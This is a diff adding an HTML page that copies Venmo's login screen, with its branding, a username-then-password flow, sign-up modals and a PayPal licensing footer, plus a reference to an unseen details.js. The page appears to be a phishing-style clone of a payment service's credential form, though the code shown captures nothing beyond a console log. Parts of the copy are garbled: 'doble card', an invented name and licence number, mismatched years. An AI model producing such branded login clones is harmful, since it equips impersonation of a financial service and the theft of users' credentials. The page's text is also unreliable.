@@ -1,0 +1,1189 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Venmo - Log in</title>
+    <style>
+        :root {
+            --venmo-blue: #3D95CE;
+            --venmo-light-blue: #F5FAFE;
+            --border-color: #e0e0e0;
+            --text-color: #333;
+            --placeholder-color: #999;
+            --error-color: #e53e3e;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', Arial, sans-serif;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 5vh 1rem 2rem;
+            line-height: 1.5;
+            overflow: auto;
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+        }
+
+        body::-webkit-scrollbar {
+            display: none;
+        }
+
+        /* Login Box Styles */
+        .login-box {
+            width: 100%;
+            max-width: 34rem;
+            background: white;
+            border: 1px solid var(--border-color);
+            border-radius: 0.75rem;
+            padding: 2.5rem 2rem;
+            text-align: center;
+            box-shadow: 0 0.25rem 0.75rem rgba(0, 0, 0, 0.05);
+           height: 560px;
+            margin-top: 100px;
+        }
+
+        .venmo-logo {
+            height: 1.3rem;
+            width: auto;
+            margin-bottom: 2rem;
+        }
+
+        .login-title {
+            font-size: 1.5rem;
+            margin-bottom: 2rem;
+            color: var(--text-color);
+            font-weight: 400;
+            letter-spacing: 0.0125rem;
+        }
+
+        .input-group {
+            position: relative;
+            width: 100%;
+            margin-bottom: 2rem;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 1.25rem 2rem 0.6rem 1.25rem;
+            border: 1px solid var(--border-color);
+            border-radius: 0.5rem;
+            font-size: 1.1rem;
+            transition: all 0.2s;
+            height: 4rem;
+            min-height: 4rem;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--venmo-blue);
+            box-shadow: 0 0 0 2px rgba(61, 149, 206, 0.2);
+        }
+
+        .floating-label {
+            position: absolute;
+            left: 1.25rem;
+            top: 1.25rem;
+            color: var(--placeholder-color);
+            font-size: 1.1rem;
+            transition: all 0.2s ease;
+            pointer-events: none;
+        }
+
+        .input-field:focus+.floating-label,
+        .input-field:not(:placeholder-shown)+.floating-label {
+            top: 0.5rem;
+            font-size: 0.85rem;
+            color: var(--text-color);
+        }
+
+        .error-message {
+            display: flex;
+            align-items: center;
+            color: var(--error-color);
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+            margin-left: 0.25rem;
+            display: none;
+        }
+
+        .error-icon {
+            position: absolute;
+            right: 1.25rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--error-color);
+            font-size: 1.2rem;
+            font-weight: bold;
+            display: none;
+        }
+
+        .input-error {
+            border-color: var(--error-color);
+        }
+
+        .input-error+.floating-label {
+            color: var(--error-color);
+        }
+        #passwordError {
+  font-size: 12px;       /* smaller font */
+  color: red;            /* keep red color */
+  margin-top: -15px;      /* move it slightly upward */
+  margin-bottom: 10px;   /* space below */
+  font-weight: normal;   /* optional, to make it less bold */
+}
+
+
+        .next-button,
+        .signup-link {
+            width: 100%;
+            padding: 1.1rem;
+            font-size: 1.1rem;
+            border-radius: 1.5rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            min-height: 3.5rem;
+        }
+
+        .next-button {
+            background-color: var(--venmo-blue);
+            color: white;
+            border: none;
+            margin-bottom: 1.5rem;
+        }
+
+        .next-button:hover {
+            background-color: #2358ad;
+        }
+
+        .signup-link {
+            color: var(--venmo-blue);
+            text-decoration: none;
+            border: 1px solid var(--venmo-blue);
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .signup-link:hover {
+            background-color: var(--venmo-blue);
+            color: white;
+        }
+
+        /* Modal Styles */
+       .modal-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background-color: rgba(255, 255, 255, 0.95); /* updated */
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding-top: 5vh;
+    z-index: 1000;
+    opacity: 0;
+    visibility: hidden;
+    transition: all 0.4s ease;
+}
+
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .signup-modal {
+            background-color: lab(98.91% 1.33 0.46);
+            border-radius: 12px;
+            width: 100%;
+            max-width: 1200px;
+            overflow: auto;
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+            max-height: 90vh;
+            overflow-y: auto;
+            transition: transform 0.6s ease 1s;
+            margin: 0 1rem;
+         
+        }
+
+        .signup-modal::-webkit-scrollbar {
+            display: none;
+        }
+
+        .modal-overlay.active .signup-modal {
+            transform: translateY(0);
+        }
+
+        .modal-header {
+            padding: 1.5rem;
+            text-align: center;
+            border-bottom: 1px solid var(--border-color);
+            position: relative;
+        }
+
+        .modal-close {
+            position: absolute;
+            left: 1.5rem;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #666;
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: 500;
+            color: var(--text-color);
+        }
+
+        .modal-body {
+            padding: 1.5rem;
+        }
+
+        .options-container {
+            display: flex;
+            gap: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .signup-option {
+            flex: 1;
+            padding: 1.5rem;
+            border-radius: 1.6rem;
+            border: 1px solid var(--border-color);
+            cursor: pointer;
+            transition: all 0.2s;
+            min-height: 10px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .signup-option:hover {
+            border-color: var(--venmo-blue);
+            background-color: var(--venmo-light-blue);
+            transform: translateY(-3px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .signup-option.selected {
+            background-color: #cececeed;
+            box-shadow: 0 4px 12px rgba(61, 149, 206, 0.2);
+        }
+
+        .signup-option-icon {
+            font-size: 1.75rem;
+            margin-bottom: 1rem;
+            color: var(--venmo-blue);
+            margin: 1.5rem auto;
+        }
+
+        .signup-option h3 {
+            font-size: 1.125rem;
+            margin-bottom: 0.75rem;
+            margin: 1.5rem auto;
+        }
+
+        .signup-option p {
+            font-size: 0.9375rem;
+            color: #666;
+            line-height: 1.5;
+            flex-grow: 1;
+        }
+
+        .business-info {
+            margin-top: 20px;
+            padding: 25px;
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            animation: fadeIn 0.3s ease;
+            display: none;
+            margin: 20px auto 0;
+            width: 40vw;
+        }
+
+        .business-info-logo-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .business-info-logo {
+            height: 230px;
+        }
+
+        .business-info h1 {
+            font-size: 26px;
+            margin-bottom: 15px;
+        }
+
+        .business-info h2 {
+            font-size: 20px;
+            margin: 20px 0;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: #ddd;
+            margin: 20px 0;
+        }
+
+        .checkbox-list {
+            list-style-type: none;
+            padding-left: 0;
+        }
+
+        .checkbox-list li {
+            position: relative;
+            padding-left: 35px;
+            margin-bottom: 12px;
+            font-size: 1rem;
+        }
+
+        .checkbox-list li:before {
+            content: "";
+            position: absolute;
+            left: 0;
+            top: 2px;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #0085FF;
+            border-radius: 4px;
+        }
+
+        .checkbox-list li.checked:before {
+            background-color: #0085FF;
+        }
+
+        .checkbox-list li.checked:after {
+            content: "✓";
+            position: absolute;
+            left: 5px;
+            top: 0;
+            color: white;
+            font-size: 14px;
+        }
+
+        .disclaimer {
+            font-size: 0.85em;
+            color: #666;
+            margin: 15px 0;
+        }
+
+        .cta-button {
+            background-color: #0085FF;
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 6px;
+            font-size: 18px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            font-weight: 600;
+        }
+
+        .get-started-btn {
+            display: block;
+            width: 50%;
+            padding: 1.1rem;
+            background-color: var(--venmo-blue);
+            color: white;
+            border: none;
+            border-radius: 1.5rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin: 3.5rem auto;
+        }
+
+        .get-started-btn:hover {
+            background-color: #1a6fb3;
+        }
+
+        .modal-footer {
+            padding: 1.75rem;
+            background-color: #f9f9f9;
+            border-top: 1px solid var(--border-color);
+            font-size: 0.85rem;
+            color: #666;
+            text-align: center;
+        }
+
+        .modal-footer p {
+            margin-bottom: 0.75rem;
+        }
+
+        .modal-footer a {
+            color: var(--venmo-blue);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        sup {
+            font-size: 0.7em;
+            vertical-align: super;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        /* Loader Styles */
+      
+
+
+
+
+
+
+        /* Feature Item Styles */
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 0;
+            padding: 4px 0;
+        }
+
+        .feature-icon {
+            width: 52px;
+            height: 52px;
+            flex-shrink: 0;
+        }
+
+        /* Teen Modal Styles */
+        .teen-modal {
+            max-width: 50%;
+            width: 50%;
+            margin: 0 auto;
+            /* Centers the modal horizontally */
+            color: rgb(16, 16, 16);
+        }
+
+        .teen-modal-footer {
+            margin-top: auto;
+            /* Pushes footer to bottom */
+            padding: 0 1.5rem 1.5rem;
+            /* Match your modal padding */
+        }
+
+
+
+
+
+
+        /* Responsive adjustments */
+        @media (max-width: 1024px) {
+            .teen-modal {
+                max-width: 50%;
+                width: 50%;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .teen-modal {
+                max-width: 90%;
+                width: 90%;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .teen-modal {
+                max-width: 95%;
+                width: 95%;
+            }
+
+            .teen-modal-footer {
+                padding: 0 1rem 1rem;
+            }
+        }
+
+        .teen-steps {
+            list-style-type: disc;
+            padding-left: 20px;
+            margin: 1.5rem 0;
+        }
+
+        .teen-steps li {
+            margin-bottom: 1rem;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .action-button {
+            padding: 0.75rem 1.5rem;
+            border-radius: 24px;
+            font-weight: 600;
+            cursor: pointer;
+            flex: 1;
+        }
+
+        .action-button.primary {
+            background-color: var(--venmo-blue);
+            color: white;
+            border: none;
+        }
+
+        .action-button.secondary {
+            background-color: white;
+            color: var(--venmo-blue);
+            border: 1px solid var(--venmo-blue);
+        }
+
+        .footer-info {
+            font-size: 0.8rem;
+            color: #666;
+            line-height: 1.5;
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 768px) {
+            .options-container {
+                flex-direction: column;
+            }
+
+            .signup-option {
+                min-height: auto;
+            }
+
+            body {
+                padding-top: 3vh;
+                padding-bottom: 1rem;
+            }
+
+            .modal-overlay {
+                padding-top: 3vh;
+            }
+
+            .business-info {
+                width: 80%;
+                min-width: unset;
+            }
+
+            .get-started-btn {
+                width: 80%;
+            }
+
+            .login-box {
+                max-width: 28rem;
+                padding: 2rem 1.5rem;
+            }
+
+            .action-buttons {
+                flex-direction: column;
+            }
+        }
+
+        @media (max-width: 480px) {
+
+            .login-box,
+            .signup-modal {
+                padding: 1.75rem 1.25rem;
+            }
+
+            .signup-option {
+                padding: 1.5rem;
+            }
+
+            .get-started-btn {
+                width: 100%;
+            }
+
+            .modal-body {
+                padding: 1.5rem;
+            }
+
+            .business-info-logo {
+                height: 180px;
+            }
+
+            .feature-icon {
+                width: 42px;
+                height: 42px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Login Form -->
+    <div class="login-box">
+        <img src="venmo-logo.svg" alt="Venmo" class="venmo-logo">
+        <h1 class="login-title">Log in</h1>
+        <div class="input-group">
+            <input type="text" id="username" class="input-field" placeholder=" ">
+            <label for="username" class="floating-label">Email, mobile, or username</label>
+            <div class="error-icon">!</div>
+            <div id="errorMessage" class="error-message">
+                <span>Required</span>
+            </div>
+        </div>
+        <button id="nextButton" class="next-button">Next</button>
+        <a href="#" id="signupTrigger" class="signup-link">Sign up</a>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+<!-- Password Login Modal -->
+<div class="modal-overlay" id="passwordModal">
+  <div class="signup-modal" style="max-width: 400px;">
+    <div class="modal-header">
+      <img src="venmo-logo.svg" alt="Venmo" style="height: 30px; margin: 0 auto;">
+    </div>
+    <div class="modal-body">
+      <div style="text-align: center; margin-bottom: 2rem;">
+        <p style="color: #3b3a3a;font-size: 22px;">Log in</p>
+        <br><br>
+        <div style="display: flex; justify-content: center; align-items: center; gap: 34px;">
+          <p id="displayUsername" style=" font-size: 18px; letter-spacing: 0.9px;font-family: 'Open Sans', sans-serif;
+font-weight: 300;
+"></p>
+          <button style="font-weight:bold; color: #0974bb; background: none; border: none; text-decoration: underline; cursor: pointer;">Change</button>
+        </div>
+      </div>
+
+      <div class="input-group" style="position: relative;">
+        <input 
+          type="password" 
+          id="passwordInput" 
+          class="input-field" 
+          placeholder=" "
+          style="padding-right: 3.5rem; border-radius: 0.5rem; width: 100%; padding: 12px; font-size: 16px; border: 1px solid #ccc; box-sizing: border-box;"
+        >
+        <label for="passwordInput" class="floating-label">Password</label>
+
+        <div 
+          class="password-toggle-container"
+          onclick="
+            const pwInput = document.getElementById('passwordInput');
+            const toggle = this.querySelector('.password-toggle');
+            if (pwInput.type === 'password') {
+              pwInput.type = 'text';
+              this.style.backgroundColor = '#d3d3d3';
+              toggle.style.color = '#3D95CE';
+            } else {
+              pwInput.type = 'password';
+              this.style.backgroundColor = 'transparent';
+              toggle.style.color = '#999';
+            }
+          "
+          style="
+            position: absolute;
+            right: 0;
+            top: 0;
+            height: 100%;
+            width: 3rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-left: 1px solid #e0e0e0;
+            border-top-right-radius: 0.5rem;
+            border-bottom-right-radius: 0.5rem;
+            cursor: pointer;
+            transition: all 0.2s;
+          "
+        >
+          <img 
+            src="f64faaa1-254b-414e-865b-09790bbe4473.jpeg" 
+            alt="Toggle Password Visibility" 
+            class="password-toggle"
+            style="width: 25px; height: 25px; cursor: pointer; transition: filter 0.2s;"
+          />
+        </div>
+      </div>
+
+      <!-- 🔴 Error message shown if password is missing -->
+      <div id="passwordError" style="color: red; font-size: 12px; margin-top: 3px; margin-bottom: 16px;"></div>
+
+      <p style="text-align: left; margin: 0.5rem 0 2rem;">
+        <a href="forgot.html" style="color: lab(45.57% 16.68 -60.47); text-decoration: none; font-weight: bold; font-size: 13px;">Forgot password?</a>
+      </p>
+
+      <button 
+        id="loginButton" 
+        class="next-button" 
+   
+        style="margin-bottom: 1rem; background-color: #008CFF; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 21px; cursor: pointer; width: 100%; font-weight: bold;">
+        Log in
+      </button>
+
+    <a 
+  href="#" 
+  id="signupTrigger" 
+  class="signup-link" 
+  style="background: none; border: none; color: #3D95CE; cursor: pointer; font-weight: bold;" 
+  onclick="openModal()"
+>
+  Sign up
+</a>
+
+
+
+    </div>
+  </div>
+</div>
+
+<script>
+    function openPasswordModal() {
+      document.getElementById("passwordModal").style.display = "flex";
+    }
+
+    function validatePassword() {
+      const password = document.getElementById('passwordInput').value;
+      const error = document.getElementById('passwordError');
+
+      if (password.trim() === "") {
+        error.textContent = "Password cannot be empty.";
+      } else {
+        error.textContent = "";
+        // ✅ Redirect to homepage.html
+        window.location.href = "homepage.html";
+      }
+    }
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Signup Modal -->
+    <div class="modal-overlay" id="signupModal">
+        <div class="signup-modal">
+            <div class="modal-header">
+                <button class="modal-close" id="modalClose">&times;</button>
+                <h2 class="modal-title">How will you use Venmo?</h2>
+            </div>
+            <div class="modal-body">
+                <div class="options-container">
+                    <div class="signup-option selected" id="personalOption">
+                        <div class="signup-option-icon">👤</div>
+                        <h3>Personal</h3>
+                        <p>Pay and accept money from friends and businesses, email and comments encouraged.</p>
+                    </div>
+
+                    <div class="signup-option" id="teenOption">
+                        <div class="signup-option-icon">👦</div>
+                        <h3>Teen</h3>
+                        <p>Available for teens 13-17 with adult sign up. Pay and accept money from friends—plus, get a
+                            child card.</p>
+                    </div>
+
+                    <div class="signup-option" id="businessOption">
+                        <div class="signup-option-icon">🏢</div>
+                        <h3>Business</h3>
+                        <p>Record and manage payments and get notified by the Venmo community (twitter) also get a
+                            personal account.</p>
+                    </div>
+                </div>
+
+                <div class="business-info" id="businessInfo">
+                    <div class="business-info-logo-container">
+                        <img src="cardsFan.webp" alt="Venmo" class="business-info-logo">
+                    </div>
+
+                    <h1>Sell like a pro with Venmo</h1>
+
+                    <div class="divider"></div>
+
+                    <p class="feature-item">
+                        <img src="bagg.jpeg" alt="Wallet" class="feature-icon">
+                        <strong>Get up and running in minutes</strong> with essential business tools.
+                    </p>
+                    <br>
+
+                    <p class="feature-item">
+                        <img src="smiley.jpeg" alt="Wallet" class="feature-icon">
+                        <strong>Pay one of the lowest fees around</strong> — just 1.9% + 10¢ when paid with Venmo.
+                    </p>
+                    <br>
+
+                    <p class="feature-item">
+                        <img src="wallet.png" alt="Wallet" class="feature-icon">
+                        <strong>Accept Venmo, cards, Apple Pay, and Google Pay,</strong> right from your phone.
+                    </p>
+                    <br>
+
+                    <p class="feature-item">
+                        <img src="adguard.jpeg" alt="Wallet" class="feature-icon">
+                        <strong>Sell with confidence</strong> with Purchase Protection on eligible sales.
+                    </p>
+
+                    <div class="disclaimer">
+                        <p><sup>1</sup> Fees subject to change.</p>
+                        <p><sup>2</sup> Terms apply.</p>
+                    </div>
+                    <br>
+
+                    <p>No signup or monthly fees. Cancel anytime.</p>
+                    <br>
+
+                    <div class="divider"></div>
+
+                    <button class="cta-button" id="createProfileBtn"><strong>Create your profile</strong></button>
+                </div>
+
+                <button class="get-started-btn" id="getStartedBtn">Get Started</button>
+            </div>
+
+            <div class="modal-footer">
+                <p><a href="https://help.venmo.com/cs/contact-us" class="contact-info" target="_blank" style="text-decoration: none; color: inherit;">
+  Contact Us
+</a>
+· <a href="#">Manage Cookies</a></p>
+                <p>Venmo is a service of PayPal, Inc., a licensed provider of money transfer services (NMLS ID: 910457).
+                </p>
+                <p>© 2023 PayPal, Inc.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Teen Signup Modal -->
+    <div class="modal-overlay" id="teenModal">
+        <div class="signup-modal teen-modal">
+            <div class="modal-header">
+                <button class="modal-close" id="teenModalClose">&times;</button>
+                <h2 class="modal-title">Get started with Venmo</h2>
+            </div>
+
+            <div class="modal-body">
+
+                <p style="font-weight: bold;">
+                    <span style="font-size: 1em; font-weight: bold;">✔️</span>
+                    <strong>Get your own debit card.</strong> Use it to pay online, shop in-store, and move.
+                </p>
+                <p style="font-weight: bold;">
+                    <span style="font-size: 1em; font-weight: bold;">✔️</span>
+                    <strong>Stay safe</strong> with added privacy features.
+                </p>
+                <br><br>
+
+
+                <h3>Here's what to do</h3>
+                <ul class="teen-steps">
+                    <li>If your parent or guardian already sent you a text mine, use your mobile device to open the site
+                        and get started.</li>
+                    <br> <br>
+                    <li>No like? No worries. Learn more about getting your own doble card on our website and have a
+                        conversation with your parent or guardian. They can use their mobile device to tap you up
+                        whenever they're ready.</li>
+                    <br> <br>
+                </ul>
+                <br> <br> <br>
+                <div class="divider"></div>
+
+                <div class="action-buttons">
+                    <button class="action-button primary">Visit website</button>
+                    <button class="action-button secondary" id="goBackButton">Go back</button>
+                </div>
+                <br> <br> <br> <br> <br> <br> <br> <br>
+                <div class="divider"></div>
+
+                <div class="footer-info">
+                    <a 
+  href="https://help.venmo.com/cs/contact-us" 
+  target="_blank" 
+  style="text-decoration: none; color: #008CFF; font-weight: bold; font-size: 14px; display: inline-block; margin-top: 20px; margin-bottom: 10px;">
+  Contact Us
+</a>
+                    <p><strong>Nevago Cenkins</strong></p>
+                    <p>Venmo is a service of PayPal, Inc., a licensed provider of money transfer services (MELS ID:
+                        92465). All money transmission is provided by PayPal, Inc. pursuant to <strong>PayPal, Inc.'s
+                            Masters:</strong> © 2017 PayPal, Inc.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+
+
+
+  function openModal() {
+    const modal = document.getElementById("signupModal");
+    if (modal) {
+      modal.style.opacity = "1";
+      modal.style.visibility = "visible";
+    }
+  }
+
+  function closeModal() {
+    const modal = document.getElementById("signupModal");
+    if (modal) {
+      modal.style.opacity = "0";
+      modal.style.visibility = "hidden";
+    }
+  }
+
+
+
+
+
+
+        document.addEventListener('DOMContentLoaded', function () {
+            // Login validation
+            const input = document.getElementById('username');
+            const errorMessage = document.getElementById('errorMessage');
+            const errorIcon = document.querySelector('.error-icon');
+            const nextButton = document.getElementById('nextButton');
+
+            nextButton.addEventListener('click', function () {
+                if (input.value.trim() === '') {
+                    input.classList.add('input-error');
+                    errorMessage.style.display = 'flex';
+                    errorIcon.style.display = 'block';
+                } else {
+                    input.classList.remove('input-error');
+                    errorMessage.style.display = 'none';
+                    errorIcon.style.display = 'none';
+                    console.log('Proceeding with:', input.value);
+                }
+            });
+
+            input.addEventListener('input', function () {
+                if (this.value.trim() !== '') {
+                    this.classList.remove('input-error');
+                    errorMessage.style.display = 'none';
+                    errorIcon.style.display = 'none';
+                }
+            });
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// Modify your existing nextButton click handler
+nextButton.addEventListener('click', function() {
+    if (input.value.trim() === '') {
+        input.classList.add('input-error');
+        errorMessage.style.display = 'flex';
+        errorIcon.style.display = 'block';
+    } else {
+        // Show password modal with entered username
+        document.getElementById('displayUsername').textContent = input.value;
+        document.getElementById('passwordModal').classList.add('active');
+        document.body.style.overflow = 'hidden';
+        
+        // Clear any errors
+        input.classList.remove('input-error');
+        errorMessage.style.display = 'none';
+        errorIcon.style.display = 'none';
+    }
+});
+
+// Handle Change button in password modal
+document.querySelector('#passwordModal button').addEventListener('click', function() {
+    document.getElementById('passwordModal').classList.remove('active');
+});
+
+// Close password modal when clicking outside
+document.getElementById('passwordModal').addEventListener('click', function(e) {
+    if (e.target === this) {
+        this.classList.remove('active');
+        document.body.style.overflow = 'auto';
+    }
+});
+
+
+
+
+
+
+
+            // Sign Up Modal Functionality
+            const signupTrigger = document.getElementById('signupTrigger');
+            const signupModal = document.getElementById('signupModal');
+            const modalClose = document.getElementById('modalClose');
+            const getStartedBtn = document.getElementById('getStartedBtn');
+            const createProfileBtn = document.getElementById('createProfileBtn');
+
+            let selectedOption = 'personalOption';
+
+            // Open modal
+            signupTrigger.addEventListener('click', function (e) {
+                e.preventDefault();
+                signupModal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            });
+
+            // Close modal
+            modalClose.addEventListener('click', function () {
+                signupModal.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            });
+
+            // Close when clicking outside
+            signupModal.addEventListener('click', function (e) {
+                if (e.target === signupModal) {
+                    signupModal.classList.remove('active');
+                    document.body.style.overflow = 'auto';
+                }
+            });
+
+            // Option selection with business info toggle
+            const personalOption = document.getElementById('personalOption');
+            const teenOption = document.getElementById('teenOption');
+            const businessOption = document.getElementById('businessOption');
+            const businessInfo = document.getElementById('businessInfo');
+
+            function selectOption(selectedOpt) {
+                // Remove selected class from all options
+                [personalOption, teenOption, businessOption].forEach(option => {
+                    option.classList.remove('selected');
+                });
+
+                // Add selected class to clicked option
+                selectedOpt.classList.add('selected');
+                selectedOption = selectedOpt.id;
+
+                // Show/hide business info and buttons based on selection
+                if (selectedOption === 'businessOption') {
+                    businessInfo.style.display = 'block';
+                    getStartedBtn.style.display = 'none';
+                } else {
+                    businessInfo.style.display = 'none';
+                    getStartedBtn.style.display = 'block';
+                }
+            }
+
+            // Add click event listeners
+            personalOption.addEventListener('click', () => selectOption(personalOption));
+            teenOption.addEventListener('click', () => selectOption(teenOption));
+            businessOption.addEventListener('click', () => selectOption(businessOption));
+
+            // Teen Modal Functionality
+            const teenModal = document.getElementById('teenModal');
+            const teenModalClose = document.getElementById('teenModalClose');
+            const goBackButton = document.getElementById('goBackButton');
+
+            // Get Started action
+            getStartedBtn.addEventListener('click', function () {
+                if (selectedOption === 'personalOption') {
+                    window.location.href = 'signup-phone.html';
+                } else if (selectedOption === 'teenOption') {
+                    signupModal.classList.remove('active');
+                    teenModal.classList.add('active');
+                }
+            });
+
+            // Create Profile action
+            createProfileBtn.addEventListener('click', function () {
+                window.location.href = 'business.html';
+                signupModal.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            });
+
+            // Close teen modal
+            teenModalClose.addEventListener('click', function () {
+                teenModal.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            });
+
+            // Go back to options from teen modal
+            goBackButton.addEventListener('click', function () {
+                teenModal.classList.remove('active');
+                signupModal.classList.add('active');
+            });
+
+            // Close teen modal when clicking outside
+            teenModal.addEventListener('click', function (e) {
+                if (e.target === teenModal) {
+                    teenModal.classList.remove('active');
+                    document.body.style.overflow = 'auto';
+                }
+            });
+                });
+        
+  function openModal() {
+    const modal = document.getElementById('signupModal');
+    if (modal) {
+      modal.style.display = 'block';
+    } else {
+      console.error("Signup modal not found");
+    }
+  }
+
+  // Optional: hide modal when user clicks close button
+  document.addEventListener('DOMContentLoaded', function () {
+    const closeBtn = document.getElementById('modalClose');
+    if (closeBtn) {
+      closeBtn.addEventListener('click', function () {
+        const modal = document.getElementById('signupModal');
+        if (modal) {
+          modal.style.display = 'none';
+        }
+      });
+    }
+  });
+
+
+    </script>
+    
+<script src="details.js"></script>
+</body>
+
+</html>
